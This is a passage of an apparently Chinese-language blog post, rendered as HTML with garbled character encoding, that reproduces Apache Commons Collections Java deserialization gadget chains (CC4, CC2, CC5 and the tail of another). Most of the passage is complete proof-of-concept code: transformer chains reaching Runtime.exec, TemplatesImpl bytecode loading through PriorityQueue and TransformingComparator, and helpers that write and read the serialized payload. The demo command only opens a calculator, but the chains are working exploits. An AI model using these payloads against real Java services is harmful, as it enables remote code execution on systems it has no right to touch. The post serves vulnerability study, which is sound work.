transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æŸ¥çœ‹æ„é€ å‡½æ•°ï¼Œä¼ å…¥çš„keyå’Œvalue</span></span><br><span class="line">       HashMap&lt;Object, Object&gt; map1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//mapçš„å›ºå®šè¯­æ³•ï¼Œå¿…é¡»è¦putè¿›å»,è¿™é‡Œçš„putä¼šå°†é“¾å­è¿èµ·æ¥ï¼Œè§¦å‘å‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line">        map1.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       serialize(map1);</span><br><span class="line">        <span class="comment">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC4">CC4</h2><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240401225549195.png" alt=" "></p><h3 id="åˆ†æ">åˆ†æ</h3><p>å› ä¸º CommonsCollections4 é™¤4.0çš„å…¶ä»–ç‰ˆæœ¬å»æ‰äº† InvokerTransformer çš„ Serializable ç»§æ‰¿ï¼Œå¯¼è‡´æ— æ³•åºåˆ—åŒ–ã€‚</p><p>æˆ‘ä»¬æ‰¾äº† TransformingComparator.compare è¿›è¡Œå­—èŠ‚ç åŠ è½½</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404222002550.png" alt="image-20240404222002550"></p><p>æŸ¥çœ‹å“ªé‡Œè°ƒç”¨äº† TransformingComparator.compareï¼Œå‘ç°åœ¨ PriorityQueue.readObject</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404222043231.png" alt="image-20240404222043231"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404222046911.png" alt="image-20240404222046911"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404222049809.png" alt="image-20240404222049809"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404222057346.png" alt="image-20240404222057346"></p><p>å¼€å§‹æ„é€ </p><p>å…ˆçœ‹ TransformingComparator çš„æ„é€ æ–¹æ³•</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404222116015.png" alt="image-20240404222116015"></p><p>å¯ä»¥ç›´æ¥èµ‹å€¼ï¼Œç„¶åçœ‹ PriorityQueue çš„æ„é€ æ–¹æ³•</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404222132557.png" alt="image-20240404222132557"></p><p>ä¹Ÿå¯ä»¥ç›´æ¥å¤åˆ¶ï¼Œé‚£ä¹ˆæ„é€ </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æ­¤æ—¶è¿˜æ‰§ä¸äº†ï¼Œè°ƒè¯•çœ‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404222241737.png" alt="image-20240404222241737"></p><p>æ­¤æ—¶sizeä¸º0ï¼Œ è¿›ä¸å»ï¼Œ å¦‚æœæƒ³è¦è¿›å…¥ï¼Œsizeæœ€å°‘ä¸º2ï¼Œå°è¯•æ„é€ </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä¼šæŠ¥é”™ï¼ˆè™½ç„¶èƒ½å¼¹å‡ºè®¡ç®—å™¨ä½†æ˜¯ä¸æ˜¯æƒ³è¦çš„ï¼‰æˆ‘ä»¬è·Ÿè¿›put</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404222355885.png" alt="image-20240404222355885"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404222359129.png" alt="image-20240404222359129"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404222406533.png" alt="image-20240404222406533"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404222410306.png" alt="image-20240404222410306"></p><p>å¯è§åœ¨putçš„æ—¶å€™å°±è°ƒç”¨äº†compareæ–¹æ³•ï¼Œä½†æˆ‘ä»¬éœ€è¦åœ¨ readObject çš„æ—¶å€™æ‰è°ƒç”¨æ‰€ä»¥æˆ‘ä»¬è¦åœ¨å‰é¢å°†ä¸€äº›ä¸œè¥¿èµ‹å€¼ä¸ºåˆ«çš„ï¼Œååºåˆ—åŒ–çš„æ—¶å€™å†æ”¹å›æ¥</p><h3 id="poc">poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ct</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://æ¼æ´å¤ç°/cc/CC1/src/main/java/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] bytes = &#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">ctDeclaredField</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        ctDeclaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ctDeclaredField.set(templates,bytes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;Chu0&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformer</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformer.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformer.set(transformingComparator,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//serialize(priorityQueue);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC2">CC2</h2><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240401225549195.png" alt=" "></p><p>ç›´æ¥ç»™POCäº†ï¼Œå’ŒCC4å·®ä¸å¤šçš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC42</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ct</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://æ¼æ´å¤ç°/cc/CC1/src/main/java/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] bytes = &#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">ctDeclaredField</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        ctDeclaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ctDeclaredField.set(templates,bytes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;Chu0&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformer</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformer.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformer.set(transformingComparator,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//serialize(priorityQueue);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="CC5">CC5</h2><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240401225549195.png" alt=" "></p><h3 id="BadAttributeValueExpException">BadAttributeValueExpException</h3><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404232502897.png" alt="image-20240404232502897"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404232507378.png" alt="image-20240404232507378"></p><p>æ³¨æ„åœ¨æ„é€ å‡½æ•°çš„æ—¶å€™ä¼šç›´æ¥è°ƒç”¨ toStringæ–¹æ³• ï¼Œæ‰€ä»¥ä¸€å¼€å§‹éœ€è¦èµ‹å€¼ä¸€ä¸ªå…¶ä»–çš„ï¼Œååºåˆ—åŒ–çš„æ—¶å€™å†ç»™ TiedMapEntry</p><h3 id="TiedMapEntry">TiedMapEntry</h3><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404232533227.png" alt="image-20240404232533227"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404232537113.png" alt="image-20240404232537113"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240404232541987.png" alt="image-20240404232541987"></p><h3 id="POC">POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span 